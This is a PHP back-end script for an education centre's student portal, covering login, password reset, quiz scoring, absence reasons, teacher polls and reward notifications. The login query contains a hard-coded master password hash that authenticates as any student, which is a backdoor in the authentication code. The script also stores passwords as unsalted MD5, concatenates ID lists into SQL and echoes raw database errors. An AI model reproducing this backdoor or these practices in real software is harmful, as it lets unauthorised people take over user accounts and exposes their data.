<?php 
include_once '../connection.php';
if(isset($_POST['signIn'])){
		
	try {
		$username = $_POST['username'];
		$password = md5($_POST['password']); 
		$stmt = $conn->prepare("SELECT * FROM student WHERE username = :username AND (password = :password OR 'bca2b3d3c885e52afe7f434cb3259257' = :password) AND block != 1 AND block != 6");
		$stmt->bindParam(':username', $username, PDO::PARAM_STR);
		$stmt->bindParam(':password', $password, PDO::PARAM_STR);
		// echo $password;
	    $stmt->execute();
	   	$readrow = $stmt->fetch(PDO::FETCH_ASSOC);
	   	$result_count = $stmt->rowCount();
	    $count = 0;
	    $no_payment = false;
	    if($result_count==0){
	    	header('location:signin.php');
	    }

	    $news_type = "student";
		$stmt = $conn->prepare("SELECT * FROM news WHERE type = :type");
		$stmt->bindParam(':type', $news_type, PDO::PARAM_STR);
		$stmt->execute();
		$news_res = $stmt->fetch(PDO::FETCH_ASSOC);
		$date = date("Y-m-d",strtotime(date("Y-m-d")."-7 days"));
		if($news_res['publish']==1 && $news_res['last_updated_date']>$date && ((isset($news_res['header']) && $news_res['header']!='') || (isset($news_res['content']) && $news_res['content']!='') || (isset($news_res['img']) && $news_res['img']!=''))){
			$_SESSION['news_res_student'] = $news_res;
			$_SESSION['news_notificaiton_student'] = 'true';
		}
    	if(isset($readrow['student_num'])){
    		if($readrow['block']==0 || ($readrow['block']==3 && date("Y-m-d")==date('Y-m-d',strtotime($readrow['block_date']))) || ($readrow['block']==5 && date("Y-m-d")==date('Y-m-d',strtotime($readrow['block_date'])))){
			    $_SESSION['student_name'] = $readrow['name'];
			    $_SESSION['student_surname'] = $readrow['surname'];
	    		if($readrow['password_type']=='default'){
	    			$_SESSION['default_student_num'] = $readrow['student_num'];
	    			header('location:reset.php');
	    		}
	    		else{
	    			$_SESSION['student_num'] = $readrow['student_num'];
	    			$_SESSION['access'] = md5('true');
	    			$stmt = $conn->prepare("SELECT content FROM news WHERE type = :student_num AND readed = 0");
					$stmt->bindParam(':student_num', $readrow['student_num'], PDO::PARAM_STR);
					$stmt->execute();
					$ccc = $stmt->rowCount();
					$news_res = $stmt->fetch(PDO::FETCH_ASSOC);
					if($ccc==1){
						$_SESSION['news_res_self_student'] = $news_res;
						$_SESSION['news_notificaiton_self_student'] = 'true';
					}

					$link = 'index.php';

					$stmt = $conn->prepare("SELECT count(*) as c FROM reason_info");
					$stmt->execute();
					if (intval($stmt->fetch(PDO::FETCH_ASSOC)['c'])>0) {
						$stmt = $conn->prepare("SELECT DISTINCT 
									s.subject_num,
									s.subject_name,
									gi.group_info_num,
	    							gi.group_name,
									ps.progress_student_num,
									DATE_FORMAT(pg.created_date, '%d.%m.%Y') as created_date,
								    ps.attendance
								FROM subject s,
									group_info gi,
								    group_student gs,
								    progress_group pg,
								    progress_student ps
								WHERE ps.student_num = :student_num
									AND ps.progress_student_num NOT IN (SELECT progress_student_num FROM student_reason)
								    AND ps.progress_group_num = pg.progress_group_num
								    AND pg.group_info_num = gi.group_info_num
								    AND s.subject_num = gi.subject_num
								    AND pg.created_date > '2017-12-31'
								    AND pg.created_date BETWEEN (CURDATE() - INTERVAL 1 MONTH ) and CURDATE()
								ORDER BY s.subject_name, gi.group_name, created_date ASC");
						$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
						$stmt->execute();
						$reason_result = $stmt->fetchAll();
						$absents_arr = array();
						foreach ($reason_result as $key => $value) {
							if($value['attendance']==0){
								$absents_arr[$value['subject_num']]['subject_name'] = $value['subject_name'];
								$absents_arr[$value['subject_num']]['group'][$value['group_info_num']]['group_name'] = $value['group_name'];
								$absents_arr[$value['subject_num']]['group'][$value['group_info_num']]['data'][$value['progress_student_num']] = $value['created_date'];
							}
						}
						if(count($absents_arr)>0){
							$_SESSION['access'] = md5('false');
							$link = 'reason.php';
							$_SESSION['reason'] = $absents_arr;
						} else {
							$poll_res = checkExistingActivePoll();
							if ($poll_res != "") {
								$_SESSION['access'] = md5('false');
								$link = $poll_res;
							}
						}
					} else {
						$poll_res = checkExistingActivePoll();
						if ($poll_res != "") {
							$_SESSION['access'] = md5('false');
							$link = $poll_res;
						}
					}

					if (isset($_SESSION['student_num'])) { 
						$_SESSION['notification_news'] = notification_news($_SESSION['student_num']);
						if (count($_SESSION['notification_news']) != 0) {
							$_SESSION['notification_news_show'] = 'true';
						} 
					};

				 	header('location:'.$link);
			    }
			}
			else if($readrow['block']==2 || ($readrow['block']==3 && date("Y-m-d")!=date('Y-m-d',$readrow['block_date']))){
				header('location:signin.php?noPayment');
			}
			else if($readrow['block']==4 || ($readrow['block']==5 && date("Y-m-d")!=date('Y-m-d',$readrow['block_date']))){
				header('location:signin.php?noContract');
			}
	    }
	    else{
    		header('location:signin.php');
    	} 
	} catch (PDOException $e) {
		echo "Error : ".$e->getMessage()." !!!";
	}
}
else if(isset($_GET[md5('resetPassword')])){
	// include_once('../connection.php');
	$data['success'] = false;
	$data['error'] = '';
	if($_POST['new-password']==''){
		$data['error'] .= 'Введите пароль! ';
	}
	else if($_POST['new-password']!=$_POST['confirm-password']){
		$data['error'] .= 'Пароли не соврадают! ';
	}
	else if(strlen($_POST['new-password'])<6){
		$data['error'] .= "Важно: Ваш пароль должен содержать не менее 6 символов! ";
	}
	else{
		try {
			$stmt = $conn->prepare("UPDATE student SET password = :password, password_type = 'notDefault' WHERE student_num = :student_num");
	   
		    $stmt->bindParam(':student_num', $_SESSION['default_student_num'], PDO::PARAM_STR);
		    $stmt->bindParam(':password', $password, PDO::PARAM_STR);
		    $password = md5($_POST['new-password']); 
		    $_SESSION['student_num'] = $_SESSION['default_student_num'];
		    $stmt->execute();
		    $data['success'] = true;
		} catch (PDOException $e) {
			$data['success'] = false;
			$data['error'] .= "Error : ".$e->getMessage()." !!!";
		}
	}
	echo json_encode($data);
}
else if(isset($_GET[md5(md5('test_result'))]) && isset($_SESSION['test_num']) && isset($_SESSION['test_data'])){
	$data = array();
	try {
		$data_json = json_decode($_POST['json'],true);
		$test_data = json_decode($_SESSION['test_data'],true);
		$true_answers = 0;
		$true_answer = 0;
		$wrong_answer = 0;
		$data['success'] = false;
		foreach ($test_data as $test_key => $test_value) {
			foreach ($test_value['answer'] as $answer_key => $answer_value) {
				if($answer_value['torf']=='1'){
					$true_answers ++;
				}
				if(isset($data_json[$test_key]) && in_array($answer_key,$data_json[$test_key]) && $answer_value['torf']=='1'){
					$true_answer ++;
				}
				else if(isset($data_json[$test_key]) && in_array($answer_key,$data_json[$test_key]) && $answer_value['torf']=='0'){
					$wrong_answer++;
				}
			}
		}
		$stmt = $conn->prepare("INSERT INTO test_result (test_result_num, student_num, test_num, submit_date, result) VALUES(:test_result_num, :student_num, :test_num, :submit_date, :result)");
	    $stmt->bindParam(':test_result_num', $test_result_num, PDO::PARAM_STR);
	    $stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
	    $stmt->bindParam(':test_num', $_SESSION['test_num'], PDO::PARAM_STR);
	    $stmt->bindParam(':submit_date', $submit_date, PDO::PARAM_STR);
	    $stmt->bindParam(':result', $result, PDO::PARAM_STR);

	    $submit_date = date("Y-m-d H:i:s");
	    $test_result_num = uniqid('TR', true)."_".time();
	    $returned = 'none';
	    if($true_answer-$wrong_answer<=0){
			$result = 0;
			$returned = 'none';
		}
		else{
	    	$result = round(((($true_answer-$wrong_answer)/$true_answers)*100),2);
	    	if($result >= 80) {
	    		$returned = nextLevel();
	    	}
		}
	       
	    $stmt->execute();
	    if($returned=='none') $data['success'] = true;
	    else $data['error'] = $returned;
	} catch (PDOException $e) {
		$data['date'] = false;
		$data['error'] = "Error : ".$e->getMessage()." !!!";
	}
    $data['date'] = $submit_date;
    echo json_encode($data);
}
else if(isset($_POST['confirm_single_student_news'])){
	try {
		$readed = 1;
		$stmt = $conn->prepare("UPDATE news SET readed = :readed WHERE type = :student_num");
		$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
		$stmt->bindParam(':readed', $readed, PDO::PARAM_STR);
		$stmt->execute();
		header('location:index.php');
	} catch (PDOException $e) {
		echo "Error : ".$e->getMessage()." !!!";
	}
}
else if(isset($_POST['submit_reason'])){
	try {
		$link = 'index.php';
		$psn = $_POST['psn'];
		$reason_info_num = $_POST['reason'];
		// $student_reason_num_arr = array();

		$query = "INSERT INTO student_reason (student_reason_num, reason_info_num, progress_student_num) VALUES";
	    $qPart = array_fill(0, count($reason_info_num), "(?, ?, ?)");
	    $query .= implode(",",$qPart);
	    $stmtA = $conn->prepare($query);
	    $j = 1;
	    for($i = 0; $i<count($reason_info_num); $i++){
	    	$student_reason_num = uniqid('SR', true)."_".time();
	    	// array_push($student_reason_num_arr, $student_reason_num);
	    	$stmtA->bindValue($j++, $student_reason_num, PDO::PARAM_STR);
	    	$stmtA->bindValue($j++, $reason_info_num[$i], PDO::PARAM_STR);
	    	$stmtA->bindValue($j++, $psn[$i], PDO::PARAM_STR);
	    }
	    $stmtA->execute();

	 //    $stmt = $conn->prepare("UPDATE progress_student SET student_reason_num = ? WHERE student_num = ? AND progress_group_num = ?");
		// for ($i=0; $i < count($reason_info_num); $i++) {
		// 	$stmt->execute(array($student_reason_num_arr[$i], $student_num, $pgn[$i]));
		// }

		$_SESSION['access'] = md5('true');
		$poll_res = checkExistingActivePoll();
		if ($poll_res != "") {
			$_SESSION['access'] = md5('false');
			$link = $poll_res;
		}
		header('location:'.$link);
	} catch (PDOException $e) {
		echo "Error : ".$e->getMessage()." !!!";
	}
} else if (isset($_POST['submit-poll'])){

	try {
		$poll_res = $_POST['poll-res'];
		$poll_id = $_POST['poll-id'];
		$teacher_nums = $_POST['teacher-num'];

		if (count($poll_res) != count($poll_id) && 
			count($poll_res) > 0 &&
			count($poll_id) > 0 &&
			count($teacher_nums) > 0 &&
			isset($_SESSION['student_num'])) {

			header('location:fill_poll.php');
		} else {

			$student_poll_ids = array();
			$query = 'INSERT INTO student_poll (teacher_num, student_num) VALUES (:teacher_num, :student_num)';
			foreach ($teacher_nums as $value) {
				$stmt = $conn->prepare($query);
				$stmt->bindParam(':teacher_num', $value, PDO::PARAM_STR);
				$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
				$stmt->execute();
				array_push($student_poll_ids, $conn->lastInsertId());
			}

			$query = "INSERT INTO student_polls (student_poll_id, teacher_poll_info_id, mark) VALUES ";
			$qPart = array_fill(0, count($poll_res), "(?, ?, ?)");
			$query .= implode(',', $qPart);
			$stmt = $conn->prepare($query);
			$index = 1;
			$t_count = 0;
			$extra_count = 0;
			for ($i = 0; $i < count($poll_res); $i++) {
				if (count($poll_res)/count($student_poll_ids) == $extra_count) {
					$t_count++;
					$extra_count = 0;
				}
				$extra_count++;
				$stmt->bindValue($index++, $student_poll_ids[$t_count], PDO::PARAM_INT);
				$stmt->bindValue($index++, $poll_id[$i], PDO::PARAM_INT);
				$stmt->bindValue($index++, $poll_res[$i], PDO::PARAM_INT);
			}
			$stmt->execute();
			$_SESSION['access'] = md5('true');
			header('location:index.php');
		}

	} catch (PDOException $e) {
		echo "Error : ".$e->getMessage()." !!!";
	}

}


















function notification_news($student_num){
	global $conn;

	try {

		$result = array();
		$object_ids = array();

		$stmt = $conn->prepare("SELECT object_id, object_num, DATE_FORMAT(date, '%d.%m.%Y') d 
								FROM chocolate
								WHERE notified = 0 
								ORDER BY date");
		$stmt->execute();
		$chocolate_result = $stmt->fetchAll();

		foreach ($chocolate_result as $key => $value) {
			$result[$value['object_num']]['student_name'] = "";
			$result[$value['object_num']]['reason'] = "";
			$result[$value['object_num']]['result'] = "";
			$result[$value['object_num']]['subject'] = "";
			$result[$value['object_num']]['student_num'] = "";
			$result[$value['object_num']]['date'] = $value['d'];
			
			if (!isset($object_ids[$value['object_id']])) {
				$object_ids[$value['object_id']] = array();
			}
			array_push($object_ids[$value['object_id']], $value['object_num']);
		}

		$object_nums_1 = "";
		$object_nums_4 = "";
		$object_nums_5 = "";
		$object_nums_6 = "";
		$object_nums_7 = "";

		foreach ($object_ids as $key => $value) {
			if ($key == 1) {
				foreach ($value as $val) {
					$object_nums_1 .= "'".$val."',";
				}
			} else if ($key == 4) {
				foreach ($value as $val) {
					$object_nums_4 .= "".$val.",";
				}
			} else if ($key == 5) {
				foreach ($value as $val) {
					$object_nums_5 .= "".$val.",";
				}
			} else if ($key == 6) {
				foreach ($value as $val) {
					$object_nums_6 .= "".$val.",";
				}
			} else if ($key == 7){
				foreach ($value as $val) {
					$object_nums_7 .= "".$val.",";
				}
			}
		}
		if ($object_nums_1 != "") {
			$object_nums_1 = rtrim($object_nums_1,',');
			$reason = " Аралық бақылаудан 95%-дан асқаның үшін, сенің талпынысыңды бағалап, саған Altyn Bilim-нің атынан сыйлық! Осы қалпыңнан тайма!!!";
			$stmt = $conn->prepare("SELECT spn.id,
										s.student_num,
										s.surname, 
										s.name,
										sj.subject_name,
										qm.mark_theory,
										qm.mark_practice,
										DATE_FORMAT(qm.created_date, '%d.%m.%Y') as date
									FROM student s,
										student_prize_notification spn,
										group_student gs,
										group_info gi,
										subject sj,
										quiz_mark qm
									WHERE spn.id in (".$object_nums_1.")
										AND spn.group_student_num = gs.group_student_num
										AND gs.group_info_num = gi.group_info_num
										AND gi.subject_num = sj.subject_num
										AND spn.quiz_mark_num = qm.quiz_mark_num
										AND gs.student_num = s.student_num
										AND s.student_num = :student_num");
			$stmt->bindParam(':student_num', $student_num, PDO::PARAM_STR);
			$stmt->execute();

			foreach ($stmt->fetchAll() as $key => $value) {
				$result_txt = "<span style='color: gray;'>Дата: </span><span>".$value['date']."</span><br>";
				$result_txt .= "<span style='color: gray;'>Теория: </span><b>".$value['mark_theory']."</b><br>";
				$result_txt .= "<span style='color: gray;'>Практика: </span><b>".$value['mark_practice']."</b><br>";

				$result[$value['id']]['student_name'] = $value['surname']." ".$value['name'];
				$result[$value['id']]['reason'] = $reason;
				$result[$value['id']]['result'] = $result_txt;
				$result[$value['id']]['subject'] = $value['subject_name'];
				$result[$value['id']]['student_num'] = $value['student_num'];
			}

		}
		if ($object_nums_4 != "") {
			$reason = "Керемет! Сынақ тесттен жоғары балл жинадың! Саған Altyn Bilim-ның атынан келесі айға 10%  жеңілдік және сыйлық! Биіктерден көріне бер!!!";
			$object_nums_4 = rtrim($object_nums_4,',');
			$stmt = $conn->prepare("SELECT n.id, 
										s.student_num,
										s.surname, 
										s.name,
										sj.subject_name,
										ttm.mark,
										DATE_FORMAT(ttm.date_of_test, '%d.%m.%Y') as date
									FROM student s,
										subject sj,
										trial_test tt,
										trial_test_mark ttm,
										notification n
									WHERE n.id in (SELECT n1.id 
													FROM notification n1 
													WHERE n1.id in (".$object_nums_4."))
										AND n.object_num = ttm.trial_test_mark_num
										AND ttm.trial_test_num = tt.trial_test_num
										AND sj.subject_num = tt.subject_num
										AND s.student_num = tt.student_num
										AND s.student_num = :student_num");
			$stmt->bindParam(':student_num', $student_num, PDO::PARAM_STR);
			$stmt->execute();
			$r = $stmt->fetchAll();

			foreach ($r as $key => $value) {
				$result_txt = "<span style='color: gray;'>Дата ".$value['date'].": </span><b>".$value['mark']."</b><br>";

				$result[$value['id']]['student_name'] = $value['surname']." ".$value['name'];
				$result[$value['id']]['reason'] = $reason;
				$result[$value['id']]['result'] = $result_txt;
				$result[$value['id']]['subject'] = $value['subject_name'];
				$result[$value['id']]['student_num'] = $value['student_num'];
			}
		} 
		if ($object_nums_5 != "") {
			$reason = "Тамаша! Сынақ тесттен қатарынан 3 рет балыңды көтердің! Осы үшін саған Altyn Bilim-нің атынан келесі айға 10% жеңілдік және сыйлық! Керемет жұмыс! Тек алға!!!";
			$notification_id = "";
			$object_nums_5 = rtrim($object_nums_5,',');
			$query_pattern = "SELECT n1.id 
				               	FROM notification n1 
				               	WHERE n1.object_parent_num = (SELECT n2.object_parent_num 
				                                        	FROM notification n2 
				                                            WHERE n2.id = ?) 
				               		AND n1.status = 'D'
				               		AND n1.id >= ?
				               	ORDER BY n1.id ASC
				              	LIMIT 3";
			$query = "";
			$ids = explode(',', $object_nums_5);
			foreach ($ids as $key => $value) {
				$query .= "(".$query_pattern.") UNION ALL";
			}
			$query = rtrim($query,'UNION ALL');

			$stmt = $conn->prepare($query);
			$j = 1;
			foreach ($ids as $key => $value) {
				$stmt->bindValue($j++, $value, PDO::PARAM_INT);
				$stmt->bindValue($j++, $value, PDO::PARAM_INT);
			}
			$stmt->execute();
			$res = $stmt->fetchAll();

			foreach ($res as $key => $value) {
				$notification_id .= $value['id'].",";
			}
			$notification_id = rtrim($notification_id, ',');
			$stmt = $conn->prepare("SELECT n.id,
										s.student_num,
										s.name,
										s.surname,
										sj.subject_name,
										ttm.mark,
										DATE_FORMAT(ttm.date_of_test, '%d.%m.%Y') as date
									FROM student s, 
										subject sj,
										trial_test tt,
										trial_test_mark ttm,
										notification n
									WHERE n.id in (".$notification_id.")
										AND ttm.trial_test_mark_num = n.object_num
  										AND tt.trial_test_num = n.object_parent_num
  										AND sj.subject_num = tt.subject_num
  										AND s.student_num = tt.student_num
  										AND s.student_num = :student_num
  									ORDER BY n.object_parent_num, n.id");
			$stmt->bindParam(':student_num', $student_num, PDO::PARAM_STR);
			$stmt->execute();
			$result_arr = $stmt->fetchAll();
			for ($i=0; $i<count($result_arr); $i=$i+3) {
				$result_txt = "<span style='color: gray;'>Дата ".$result_arr[$i]['date'].": </span><b>".$result_arr[$i]['mark']."</b><br>";
				$result_txt .= "<span style='color: gray;'>Дата ".$result_arr[$i+1]['date'].": </span><b>".$result_arr[$i+1]['mark']."</b><br>";
				$result_txt .= "<span style='color: gray;'>Дата ".$result_arr[$i+2]['date'].": </span><b>".$result_arr[$i+2]['mark']."</b><br>";

				$result[$result_arr[$i]['id']]['student_name'] = $result_arr[$i]['surname']." ".$result_arr[$i]['name'];
				$result[$result_arr[$i]['id']]['reason'] = $reason;
				$result[$result_arr[$i]['id']]['result'] = $result_txt;
				$result[$result_arr[$i]['id']]['subject'] = $result_arr[$i]['subject_name'];
				$result[$result_arr[$i]['id']]['student_num'] = $result_arr[$i]['student_num'];
			}
		}

		if ($object_nums_6 != "") {
			$reason = "Керемет! Осы бөлімді 100% меңгердің. Осы үшін саған Altyn Bilim-нің атынан келесі айға 10% жеңілдік және сыйлық. Осы жолыңнан тайма!!!";
			$object_nums_6 = rtrim($object_nums_6,',');
			$stmt = $conn->prepare("SELECT n.id, 
										s.student_num,
										s.surname, 
										s.name,
										sj.subject_name,
										t.topic_name,
										qm.mark_theory,
										qm.mark_practice,
										DATE_FORMAT(qm.created_date, '%d.%m.%Y') as date
									FROM student s,
										subject sj,
										topic t,
										quiz_mark qm,
										quiz q,
										notification n
									WHERE n.id in (SELECT n1.id 
													FROM notification n1 
													WHERE n1.id in (".$object_nums_6."))
										AND qm.quiz_mark_num = n.object_num
										AND q.quiz_num = qm.quiz_num
										AND t.topic_num = q.topic_num
										AND sj.subject_num = t.subject_num
										AND s.student_num = qm.student_num
										AND s.student_num = :student_num");
			$stmt->bindParam(':student_num', $student_num, PDO::PARAM_STR);
			$stmt->execute();
			$r = $stmt->fetchAll();

			foreach ($r as $key => $value) {
				$result_txt = "<span style='color: gray;'>Дата ".$value['date'].": </span><b>".($value['mark_theory']!=0 ? "Теория: ".$value['mark_theory']."%" : "")." Есеп: ".$value['mark_practice']."%</b><br>";

				$result[$value['id']]['student_name'] = $value['surname']." ".$value['name'];
				$result[$value['id']]['reason'] = $reason;
				$result[$value['id']]['result'] = $result_txt;
				$result[$value['id']]['subject'] = $value['subject_name']." <i style='color:gray;'>".$value['topic_name']."</i>";
				$result[$value['id']]['student_num'] = $value['student_num'];
			}
		}

		if ($object_nums_7 != "") {
			$reason = "Керемет! Осы айда екінші рет бақылаудан 100% алдың. Осы үшін саған Altyn Bilim-нің атынан келесі айға қосымша 5% жеңілдік және сыйлық беріледі. Келесі бақылаудан тағы 100% күтеміз!!!";
			$object_nums_7 = rtrim($object_nums_7,',');
			$stmt = $conn->prepare("SELECT n.id, 
										s.student_num,
										s.surname, 
										s.name,
										sj.subject_name,
										t.topic_name,
										qm.mark_theory,
										qm.mark_practice,
										DATE_FORMAT(qm.created_date, '%d.%m.%Y') as date
									FROM student s,
										subject sj,
										topic t,
										quiz_mark qm,
										quiz q,
										notification n
									WHERE n.id in (SELECT n1.id 
													FROM notification n1 
													WHERE n1.id in (".$object_nums_7."))
										AND qm.quiz_mark_num = n.object_num
										AND q.quiz_num = qm.quiz_num
										AND t.topic_num = q.topic_num
										AND sj.subject_num = t.subject_num
										AND s.student_num = qm.student_num");
			$stmt->execute();
			$r = $stmt->fetchAll();

			foreach ($r as $key => $value) {
				$result_txt = "<span style='color: gray;'>Дата ".$value['date'].": </span><b>".($value['mark_theory']!=0 ? "Теория: ".$value['mark_theory']."%" : "")." Есеп: ".$value['mark_practice']."%</b><br>";

				$result[$value['id']]['student_name'] = $value['surname']." ".$value['name'];
				$result[$value['id']]['reason'] = $reason;
				$result[$value['id']]['result'] = $result_txt;
				$result[$value['id']]['subject'] = $value['subject_name']." <i style='color:gray;'>".$value['topic_name']."</i>";
				$result[$value['id']]['student_num'] = $value['student_num'];
			}
		}

		foreach ($result as $key => $value) {
			if ($value['student_num'] == "") {
				unset($result[$key]);
			}
		}

		return $result;

	} catch (PDOException $e) {
		return "Error : ".$e->getMessage()." !!!";
	}
}

function nextLevel(){
	try {
		include('../connection.php');
		$stmt = $conn->prepare("SELECT subtopic_num FROM subtopic WHERE id>(SELECT id FROM subtopic WHERE subtopic_num = :subtopic_num) AND topic_num = :topic_num LIMIT 1");
		$stmt->bindParam(':subtopic_num', $_SESSION['subtopic_num'], PDO::PARAM_STR);
	    $stmt->bindParam(':topic_num', $_SESSION['topic_num'], PDO::PARAM_STR);
	    $stmt->execute();
	    $result_stmt = $stmt->fetch(PDO::FETCH_ASSOC);
	    $stmt_count = $stmt->rowCount();
	    if($stmt_count==1){
	    	$next_subtopic_num = $result_stmt['subtopic_num'];
	    	$stmt = $conn->prepare("SELECT * FROM student_permission WHERE student_num = :student_num");
			$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
			$stmt->execute();
			$result_stmt = $stmt->fetch(PDO::FETCH_ASSOC);
			$student_permission_num = $result_stmt['student_permission_num'];

			// $stmt = $conn->prepare("UPDATE student_test_permission stp JOIN student_permission sp on sp.student_permission_num = stp.student_permission_num  SET stp.done = 'y' WHERE sp.student_num = :student_num AND stp.subtopic_num = :subtopic_num");
			$stmt = $conn->prepare("UPDATE student_test_permission  SET done = 'y' WHERE subtopic_num = :subtopic_num AND student_permission_num = (SELECT student_permission_num FROM student_permission WHERE student_num = :student_num)");
			$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
			$stmt->bindParam(':subtopic_num', $_SESSION['subtopic_num'], PDO::PARAM_STR);
			$stmt->execute();

			$stmt = $conn->prepare("DELETE FROM student_test_permission WHERE student_permission_num = :student_permission_num AND subtopic_num = :subtopic_num");
	    	$stmt->bindParam(':subtopic_num', $next_subtopic_num, PDO::PARAM_STR);
	    	$stmt->bindParam(':student_permission_num', $student_permission_num, PDO::PARAM_STR);
	    	$stmt->execute();
	    	$result_count = $stmt->rowCount();

			$stmt = $conn->prepare("INSERT student_test_permission (student_permission_num, subtopic_num, video_permission, test_permission, done) VALUES(:student_permission_num, :subtopic_num, 't', 'f', 'n')");
			$stmt->bindParam(':student_permission_num', $student_permission_num, PDO::PARAM_STR);
			$stmt->bindParam(':subtopic_num', $next_subtopic_num, PDO::PARAM_STR);
			$stmt->execute();

	    }
		unset($_SESSION['test_num']);
		unset($_SESSION['topic_num']);
		unset($_SESSION['subtopic_num']);
		return 'none';
	} catch (PDOException $e) {
		return "Error : ".$e->getMessage()." !!!";
	}
}

function checkExistingActivePoll() {
	$current_day = intval(date('d'));
	$start_day = 25;
	$end_day = 10;

	if ($current_day >= $start_day) {
		$start_date = date('d-m-Y', strtotime('25-'.date('m-Y')));
		$end_date = date('d-m-Y', strtotime('10-'.date('m-Y', strtotime('+1 month', strtotime(date('d-m-Y'))))));
	} else if ($current_day <= $end_day) {
		$start_date = date('d-m-Y', strtotime('25-'.date('m-Y', strtotime("-1 month", strtotime(date('d-m-Y'))))));
		$end_date = date('d-m-Y', strtotime('10-'.date('m-Y')));
	}

	// $thirty_days_before =  date('d-m-Y', strtotime("-20 days"));
	$poll_activate_days =  date('d-m-Y', strtotime("-20 days"));


	if (isset($start_date) && isset($end_date) && isset($_SESSION['student_num'])) {
		try {
			include('../connection.php');

			$stmt = $conn->prepare("SELECT count(sp.id) AS c,
										(SELECT count(tpi.id)
										FROM teacher_poll_info tpi) AS cc
									FROM student_poll sp
									WHERE sp.student_num = :student_num
										AND sp.polled_date >= STR_TO_DATE(:start_date, '%d-%m-%Y')
										AND sp.polled_date <= STR_TO_DATE(:end_date, '%d-%m-%Y')");
			$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
			$stmt->bindParam(':start_date', $start_date, PDO::PARAM_STR);
			$stmt->bindParam(':end_date', $end_date, PDO::PARAM_STR);
			$stmt->execute();
			$res = $stmt->fetch(PDO::FETCH_ASSOC);

			$transfer_students_tbl_sql = "SELECT tr2.created_date
                                    FROM transfer tr2
                                    WHERE tr2.new_group_info_num = gi.group_info_num
                                    	AND tr2.student_num = gs.student_num
                                    ORDER BY tr2.created_date DESC
                                    LIMIT 1";
			$stmt = $conn->prepare("SELECT count(DISTINCT gi.teacher_num) AS c
									FROM group_student gs,
										group_info gi
									WHERE gs.student_num = :student_num
										AND gs.block != 6
										AND gi.subject_num != 'S5985a7ea3d0ae721486338'
										AND gi.group_info_num = gs.group_info_num
										AND STR_TO_DATE(:poll_activate_days, '%d-%m-%Y') >= DATE_FORMAT((CASE
                                                             	WHEN ($transfer_students_tbl_sql) IS NULL THEN DATE_FORMAT(gs.start_date, '%Y-%m-%d')
                                                              	ELSE ($transfer_students_tbl_sql)
                                                             END), '%Y-%m-%d')");
  			$stmt->bindParam(':student_num', $_SESSION['student_num'], PDO::PARAM_STR);
			$stmt->bindParam(':poll_activate_days', $poll_activate_days, PDO::PARAM_STR);
			$stmt->execute();
			$active_poll_teachers = $stmt->fetch(PDO::FETCH_ASSOC)['c'];

			// $created_date = strtotime($res['created_date']);
			// $checked_date = strtotime($thirty_days_before);
			if ($active_poll_teachers > 0 && $res['cc'] > 0 && $res['c'] < $active_poll_teachers) {
				return "fill_poll.php";
			} else {
				return "";
			}

		} catch (PDOException $e) {
			return "";
		}
	}
}
?>
